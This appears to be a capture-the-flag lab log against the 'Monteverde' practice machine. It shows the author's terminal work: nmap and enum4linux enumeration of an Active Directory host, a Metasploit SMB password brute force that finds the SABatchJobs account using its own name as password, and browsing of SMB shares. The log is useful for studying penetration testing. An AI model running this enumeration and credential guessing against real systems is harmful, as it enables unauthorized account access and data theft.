allenwest1@debian:~$ ping 10.10.10.172
PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=20.1 ms
64 bytes from 10.10.10.172: icmp_seq=2 ttl=127 time=18.1 ms
64 bytes from 10.10.10.172: icmp_seq=3 ttl=127 time=22.1 ms
^C
--- 10.10.10.172 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 6ms
rtt min/avg/max/mdev = 18.146/20.099/22.053/1.599 ms
allenwest1@debian:~$ nmap -sV -sC -Pn 10.10.10.172
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-15 13:41 EDT
Nmap scan report for 10.10.10.172
Host is up (0.074s latency).
Not shown: 991 filtered ports
PORT    STATE SERVICE       VERSION
53/tcp  open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-15 17:54:24Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=4/15%Time=5E974765%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 12m30s, deviation: 0s, median: 12m30s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-15 13:56:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.26 seconds
.
.
.
// Got some weird ports so I'll try something new.
.
.
.
allenwest1@debian:~/Desktop$ cd enum4linux-0.8.9/
allenwest1@debian:~/Desktop/enum4linux-0.8.9$ ls
CHANGELOG           COPYING.GPL    share-list.txt                       
COPYING.ENUM4LINUX  enum4linux.pl                                       
allenwest1@debian:~/Desktop/enum4linux-0.8.9$ ./enum4linux.pl 10.10.10.172                 
.
.
.
// Used this to find the usernames:
.
.
.
allenwest1@debian:~/Desktop/enum4linux-0.8.9$ cd ..
allenwest1@debian:~/Desktop$ nano users.txt
allenwest1@debian:~/Desktop$ nano pass.txt
allenwest1@debian:~/Desktop$ msfconsole
Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
Starting database at /home/allenwest1/.msf4/db...success
[?] Initial MSF web service account username? [allenwest1]: 
[?] Initial MSF web service account password? (Leave blank for random password): 
Generating SSL key and certificate for MSF web service
MSF web service PID file found, but no active process running as PID 1802
Deleting MSF web service PID file /home/allenwest1/.msf4/msf-ws.pid
Attempting to start MSF web service...failed
[!] MSF web service appears to be started, but may not operate as expected.
MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
Please see /home/allenwest1/.msf4/logs/msf-ws.log for additional details.
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  
     ,           ,
    /             \                                                     
   ((__---,,,---__))                                                    
      (_) O O (_)_________                                              
         \ _ /            |\                                            
          o_o \   M S F   | \                                           
               \   _____  |  *                                          
                |||   WW|||                                             
                |||     |||                                             
                                                                        

       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View useful productivity tips with the tip command, or view them all with tip -l

msf5 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner


msf5 > use 0
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.172
RHOSTS => 10.10.10.172
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE pass.txt
USERPASS_FILE => pass.txt
msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 10.10.10.172:445      - 10.10.10.172:445 - Starting SMB login bruteforce
[*] 10.10.10.172:445      - 10.10.10.172:445 - Correct credentials, but unable to login: '.\Guest:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\AAD_987d7f2f57d2:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-ata:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-bexec:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-netapp:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\dgalanos:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\roleary:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\smorgan:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\:',
[*] 10.10.10.172:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE pass.txt
PASS_FILE => pass.txt
msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 10.10.10.172:445      - 10.10.10.172:445 - Starting SMB login bruteforce
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:Guest',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:mhope',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:SABatchJobs',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:AAD_987d7f2f57d2',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-ata',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-bexec',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-netapp',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:dgalanos',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:roleary',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:smorgan',
[*] 10.10.10.172:445      - 10.10.10.172:445 - Correct credentials, but unable to login: '.\Guest:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:Guest',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:mhope',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:SABatchJobs',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:AAD_987d7f2f57d2',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-ata',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-bexec',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-netapp',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:dgalanos',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:roleary',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:smorgan',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:Guest',
[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:mhope',
[+] 10.10.10.172:445      - 10.10.10.172:445 - Success: '.\SABatchJobs:SABatchJobs'
.
.
.
// [+] 10.10.10.172:445      - 10.10.10.172:445 - Success: '.\SABatchJobs:SABatchJobs'
.
.
.
allenwest1@debian:~/Desktop$ smbclient -L 10.10.10.172 -U SABatchJobs
mkdir failed on directory /var/run/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
allenwest1@debian:~/Desktop$ smbclient //10.10.10.172/users$ -U SABatchJobs
mkdir failed on directory /var/run/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> 
.
.
.
// continue in asSABatchJobs1.bash
